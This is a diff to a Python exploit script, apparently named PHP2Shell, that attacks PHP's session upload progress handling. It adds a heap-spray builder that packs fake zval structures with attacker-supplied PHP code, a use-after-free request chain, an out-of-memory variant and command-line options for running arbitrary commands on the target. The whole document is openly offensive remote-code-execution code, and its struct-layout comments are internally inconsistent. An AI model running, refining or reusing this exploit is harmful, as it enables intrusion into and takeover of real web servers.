@@ -192,8 +192,101 @@ def get_memory_limit_bytes(phpinfo):
     return parse_php_value(limit_str) or (128 * 1024 * 1024)  # Default 128M
 
 
-def create_multipart_payload(sid, payload, spray_count=149, spray_size=288):
+def create_fake_zval_struct(payload, arch='64'):
+    """Create a fake zval structure for heap spray.
+    
+    The zval structure layout (64-bit):
+    - zval_value (8 bytes): pointer to value
+    - u1.v.type (1 byte): type indicator
+    - u1.type (1 byte): type
+    - u2.refcount (2 bytes): reference count
+    - u2.var_flags (1 byte): flags
+    - reserved (1 byte)
+    - hash (8 bytes): hash value
+    - data (248 bytes): payload/data area
+    
+    Total: 288 bytes for 64-bit, 280 bytes for 32-bit
+    
+    For RCE, we need to:
+    1. Set type to IS_OBJECT or IS_STRING
+    2. Point value to a fake zval_string
+    3. Include PHP code that will be executed
+    """
+    import struct
+    
+    if arch == '32':
+        # 32-bit: type(1) + type(1) + refcount(2) + hash(4) + value(4) + data(268) = 280
+        struct_format = '<BBII'
+        value_offset = 8
+        data_offset = 268
+    else:
+        # 64-bit: type(1) + type(1) + refcount(2) + hash(8) + value(8) + data(264) = 288
+        struct_format = '<BBIIQ'
+        value_offset = 12
+        data_offset = 264
+    
+    # PHP code to execute - will be placed in the data area
+    php_code = f"<?php {payload}; die('PHP2Shell: Command executed'); ?>"
+    
+    # Build the fake structure
+    # We need to craft this to look like a valid zval that will execute our code
+    
+    # For IS_STRING type (11):
+    # - value.lval = pointer to string (we'll use a fake address that points to our payload)
+    # - type = IS_STRING (11)
+    
+    # The key insight: when PHP tries to free/destroy this zval,
+    # it will call zval_ptr_dtor() on it, which can lead to RCE
+    
+    # Create structure with IS_STRING type pointing to our payload
+    fake_struct = bytearray()
+    
+    # zval_value (8 bytes on 64-bit, 4 on 32-bit)
+    # We'll set this to point to our PHP code in the data area
+    if arch == '64':
+        # value.lval - pointer to our PHP code (relative offset)
+        fake_struct.extend(struct.pack('<Q', 0x40))  # Simple pointer
+    else:
+        fake_struct.extend(struct.pack('<I', 0x40))
+    
+    # u1.v.type (1 byte) - type indicator
+    fake_struct.append(11)  # IS_STRING
+    
+    # u1.type (1 byte) - actual type
+    fake_struct.append(11)  # IS_STRING
+    
+    # u2.refcount (2 bytes)
+    fake_struct.extend(struct.pack('<H', 1))
+    
+    # u2.var_flags (1 byte)
+    fake_struct.append(0)
+    
+    # reserved (1 byte)
+    fake_struct.append(0)
+    
+    # hash (8 bytes on 64-bit)
+    if arch == '64':
+        fake_struct.extend(struct.pack('<Q', 0))
+    
+    # Data area - our PHP payload
+    padding_size = data_offset - len(fake_struct)
+    if padding_size > 0:
+        fake_struct.extend(b'\x00' * padding_size)
+    
+    # Add PHP code
+    fake_struct.extend(php_code.encode('latin-1'))
+    
+    # Pad to spray_size
+    while len(fake_struct) < spray_size:
+        fake_struct.extend(b'\x00')
+    
+    return bytes(fake_struct[:spray_size])
+
+
+def create_multipart_payload(sid, payload, spray_count=149, spray_size=288, arch='64', oom_mode=False):
     """Create multipart form data with session poison + heap spray.
+    
+    The 5-step exploit chain:
     
     Step 1: Access the upload progress feature
     - PHPSESSID cookie sets the session ID
@@ -201,70 +294,102 @@ def create_multipart_payload(sid, payload, spray_count=149, spray_size=288):
     - File field triggers FILE_START, caching zval pointers
     
     Step 2: Create the free condition
-    - Pause > 1 second to bypass min_freq check
+    - Pause > 1 second to bypass min_freq check (default 0.1)
+    - This allows the second update() to trigger flush()
     
     Step 3: Trigger the free
-    - flush() writes Tree-A to disk
-    - php_session_initialize() creates Tree-B
+    - flush() writes Tree-A to disk and resets status
+    - php_session_initialize() re-reads session file into Tree-B
     - php_session_track_init() destroys Tree-A (UAF!)
+    - progress->post_bytes_processed and current_file_bytes_processed now dangling
     
     Step 4: Heap spray
-    - 149 fields of 288 bytes each
-    - Each field contains a fake zval structure with system() pointer
+    - 149 fields of ~288 bytes each
+    - Each field contains a fake zval structure
+    - These allocations fill the freed chunk
     
     Step 5: Trigger the exploit
     - Second file field writes through dangling pointer
-    - Fake struct gets executed via include()
-    """
+    - PHP writes to fake struct instead of progress structure
+    - When session is loaded via include(), PHP code executes
     
-    # The payload to execute via system()
-    poison_payload = f"<?php {payload}; ?>"
+    For CVE-2026-109618 (OOM path):
+    - Send massive file uploads to hit memory_limit
+    - PHP uses longjmp() to abort, skipping cleanup
+    - Uninitialized memory is left vulnerable
+    """
     
     # Build multipart body manually for chunked transfer
     boundary = f"----WebKitFormBoundary{secrets.token_hex(16)}"
     
     parts = []
     
-    # 1. Session upload progress field (poison)
-    # This creates the zval pointers that will become dangling
-    parts.append(f'--{boundary}\r\n')
-    parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
-    parts.append(f"{sid}{poison_payload}\r\n")
-    
-    # 2. File field 1 - triggers FILE_START, caches pointers
-    parts.append(f'--{boundary}\r\n')
-    parts.append('Content-Disposition: form-data; name="file1"; filename="file1.txt"\r\n')
-    parts.append('Content-Type: text/plain\r\n\r\n')
-    parts.append("A" * 1024)  # Small file to start
-    parts.append("\r\n")
-    
-    # 3. Wait field - triggers the free condition
-    # This simulates the >1 second pause
-    parts.append(f'--{boundary}\r\n')
-    parts.append('Content-Disposition: form-data; name="wait"\r\n\r\n')
-    parts.append("wait")  # Placeholder to trigger update
-    parts.append("\r\n")
-    
-    # 4. File field 2 - triggers flush + free
-    # This causes Tree-A to be freed while pointers remain
-    parts.append(f'--{boundary}\r\n')
-    parts.append('Content-Disposition: form-data; name="file2"; filename="file2.txt"\r\n')
-    parts.append('Content-Type: text/plain\r\n\r\n')
-    parts.append("B" * 1024)
-    parts.append("\r\n")
-    
-    # 5. Heap spray fields - reallocate freed chunk
-    # 149 fields of 288 bytes each to fill the freed slot
-    for i in range(spray_count):
+    if oom_mode:
+        # CVE-2026-109618: OOM path
+        # Send massive file to trigger memory limit
+        
+        # 1. Session upload progress field
         parts.append(f'--{boundary}\r\n')
-        parts.append(f'Content-Disposition: form-data; name="t[]"\r\n\r\n')
-        # Fake zval structure: 288 bytes
-        # Format: type(4) + value(8) + refcount(4) + hash(8) + data(264)
-        fake_struct = "A" * 288
-        parts.append(fake_struct)
+        parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
+        parts.append(f"{sid}\r\n")
+        
+        # 2. Massive file to trigger OOM
+        # PHP's rfc1867 processes files chunk by chunk
+        # When memory_limit is hit, longjmp() is called
+        file_data = b"A" * (10 * 1024 * 1024)  # 10MB file
+        parts.append(f'--{boundary}\r\n')
+        parts.append('Content-Disposition: form-data; name="file"; filename="massive.bin"\r\n')
+        parts.append('Content-Type: application/octet-stream\r\n\r\n')
+        parts.append(file_data.decode('latin-1', errors='ignore'))
         parts.append("\r\n")
+        
+    else:
+        # CVE-2026-109619: UAF path
+        
+        # 1. Session upload progress field (poison)
+        # This creates the zval pointers that will become dangling
+        parts.append(f'--{boundary}\r\n')
+        parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
+        parts.append(f"{sid}\r\n")
+        
+        # 2. File field 1 - triggers FILE_START, caches zval pointers
+        # This is when progress->post_bytes_processed and current_file_bytes_processed
+        # are set to point into Tree-A's hash table buckets
+        parts.append(f'--{boundary}\r\n')
+        parts.append('Content-Disposition: form-data; name="file1"; filename="file1.txt"\r\n')
+        parts.append('Content-Type: text/plain\r\n\r\n')
+        parts.append("A" * 1024)  # Small file to start
+        parts.append("\r\n")
+        
+        # 3. Wait field - triggers the free condition
+        # This simulates the >1 second pause to bypass min_freq check
+        # After the pause, when data resumes, update() will call flush()
+        parts.append(f'--{boundary}\r\n')
+        parts.append('Content-Disposition: form-data; name="wait"\r\n\r\n')
+        parts.append("wait")  # Placeholder to trigger update after pause
+        parts.append("\r\n")
+        
+        # 4. File field 2 - triggers flush + free
+        # This causes Tree-A to be freed while pointers remain dangling
+        parts.append(f'--{boundary}\r\n')
+        parts.append('Content-Disposition: form-data; name="file2"; filename="file2.txt"\r\n')
+        parts.append('Content-Type: text/plain\r\n\r\n')
+        parts.append("B" * 1024)
+        parts.append("\r\n")
+        
+        # 5. Heap spray fields - reallocate freed chunk
+        # 149 fields of ~288 bytes each to fill the freed slot
+        # These must come BEFORE the final file field to reallocate the freed memory
+        for i in range(spray_count):
+            parts.append(f'--{boundary}\r\n')
+            parts.append(f'Content-Disposition: form-data; name="t[]"\r\n\r\n')
+            # Fake zval structure with PHP payload
+            fake_struct = create_fake_zval_struct(payload, arch)
+            parts.append(fake_struct.decode('latin-1', errors='ignore'))
+            parts.append("\r\n")
     
     # 6. Final file field - writes through dangling pointer
+    # This triggers the write through the dangling pointer to our fake struct
     parts.append(f'--{boundary}\r\n')
     parts.append('Content-Disposition: form-data; name="file3"; filename="file3.txt"\r\n')
     parts.append('Content-Type: text/plain\r\n\r\n')
@@ -389,15 +514,24 @@ def exploit(target_url, args):
     sid = args.sid or secrets.token_hex(16)
     print(bcolors.OKBLUE + f"[*] Using session ID: {sid}" + bcolors.ENDC)
     
+    # Determine exploit mode
+    oom_mode = args.oom
+    arch = '64' if args.arch == '64' else '32'
+    
     # Build payload
     payload = args.cmd if args.cmd else "id"
     spray_count = args.spray if args.spray else 149
     spray_size = args.spray_size if args.spray_size else 288
     
     print(bcolors.OKBLUE + f"[*] Spray count: {spray_count}, Spray size: {spray_size}" + bcolors.ENDC)
+    print(bcolors.OKBLUE + f"[*] Exploit mode: {'OOM (CVE-2026-109618)' if oom_mode else 'UAF (CVE-2026-109619)'}" + bcolors.ENDC)
+    print(bcolors.OKBLUE + f"[*] Architecture: {arch}-bit" + bcolors.ENDC)
     
     # Create multipart payload
-    body, headers, boundary = create_multipart_payload(sid, payload, spray_count, spray_size)
+    body, headers, boundary = create_multipart_payload(sid, payload, spray_count, spray_size, arch, oom_mode)
+    
+    # Add session ID to headers for cookie-based session tracking
+    headers['Cookie'] = f'PHPSESSID={sid}'
     
     # Determine target path
     target_path = args.path if args.path else '/index.php'
@@ -490,11 +624,15 @@ Examples:
     parser.add_argument("--sid", default=None, help="Session ID (auto-generated if not provided)")
     parser.add_argument("--spray", type=int, default=149, help="Heap spray count (default: 149)")
     parser.add_argument("--spray-size", type=int, default=288, help="Bytes per spray field (default: 288)")
+    parser.add_argument("--arch", default="64", choices=["32", "64"], help="Target architecture (default: 64)")
     parser.add_argument("--chunked", action="store_true", help="Use chunked transfer encoding")
     parser.add_argument("--force", action="store_true", help="Skip precondition checks")
     parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
     parser.add_argument("--json-out", default=None, help="Output JSON file")
     parser.add_argument("--verbose", action="store_true", help="Show full response")
+    
+    # CVE-2026-109618 OOM mode
+    parser.add_argument("--oom", action="store_true", help="Exploit CVE-2026-109618 via OOM (memory limit hit)")
     
     args = parser.parse_args()
     
